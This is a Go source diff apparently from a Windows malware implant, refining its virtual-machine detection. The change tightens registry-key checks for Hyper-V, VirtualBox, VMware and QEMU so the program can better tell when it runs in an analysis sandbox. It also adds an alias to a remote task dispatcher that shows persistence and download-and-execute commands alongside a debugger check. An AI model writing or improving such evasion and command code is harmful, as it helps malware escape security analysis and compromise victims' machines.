@@ -156,29 +156,45 @@ func isDebugger() bool {
 	return port != 0
 }
 
-func isVM() bool {
-	keys := []string{
-		"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
-		"SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
-		"SYSTEM\\CurrentControlSet\\Services\\vmci",
-		"SYSTEM\\CurrentControlSet\\Services\\vmhgfs",
-		"SYSTEM\\CurrentControlSet\\Services\\vmmouse",
-		"HARDWARE\\ACPI\\DSDT\\VBOX__",
-		"HARDWARE\\ACPI\\DSDT\\VMware",
-		"HARDWARE\\ACPI\\DSDT\\QEMU",
+func regKeyExists(sub string) bool {
+	var h uintptr
+	kb := append([]byte(sub), 0)
+	r, _, _ := pRegOpen.Call(uintptr(0x80000002), uintptr(unsafe.Pointer(&kb[0])), 0, keyQuery, uintptr(unsafe.Pointer(&h)))
+	if r == 0 {
+		pRegClose.Call(h)
+		return true
 	}
-	for _, k := range keys {
-		var h uintptr
-		kb := append([]byte(k), 0)
-		r, _, _ := pRegOpen.Call(uintptr(0x80000002), uintptr(unsafe.Pointer(&kb[0])), 0, keyQuery, uintptr(unsafe.Pointer(&h)))
-		if r == 0 {
-			pRegClose.Call(h)
-			return true
-		}
+	return false
+}
+
+func isVM() bool {
+	// A bare-metal box can carry a stray vmci service (many do), so a single
+	// weak service key is not enough — each vendor needs a strong marker.
+	//
+	// Hyper-V guest: this key only exists inside the guest partition.
+	if regKeyExists(`SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters`) {
+		return true
+	}
+	// VirtualBox
+	if regKeyExists(`SYSTEM\CurrentControlSet\Services\VBoxGuest`) ||
+		regKeyExists(`SYSTEM\CurrentControlSet\Services\VBoxMouse`) ||
+		regKeyExists(`HARDWARE\ACPI\DSDT\VBOX__`) {
+		return true
+	}
+	// VMware: vmci alone false-positives, so require shared-folders / mouse /
+	// the VMware DSDT entry instead of the bare service.
+	if regKeyExists(`SYSTEM\CurrentControlSet\Services\vmhgfs`) ||
+		regKeyExists(`SYSTEM\CurrentControlSet\Services\vmmouse`) ||
+		regKeyExists(`HARDWARE\ACPI\DSDT\VMware`) {
+		return true
+	}
+	// QEMU
+	if regKeyExists(`HARDWARE\ACPI\DSDT\QEMU`) {
+		return true
 	}
 	host, _ := os.Hostname()
 	hl := strings.ToLower(host)
-	for _, n := range []string{"virtualbox", "vmware", "qemu", "hyperv", "vbox"} {
+	for _, n := range []string{"virtualbox", "vmware", "qemu", "vbox"} {
 		if strings.Contains(hl, n) {
 			return true
 		}
@@ -575,7 +591,7 @@ func runTask(tID, command, argsJSON, host, port string, useTLS bool, hwid string
 		exe, _ := os.Executable()
 		persist(exe)
 		out = "persist ok"
-	case "get_processes":
+	case "get_processes", "process_list":
 		out, code = processList()
 	case "download_exec":
 		u := argStr(args, "url", "URL")
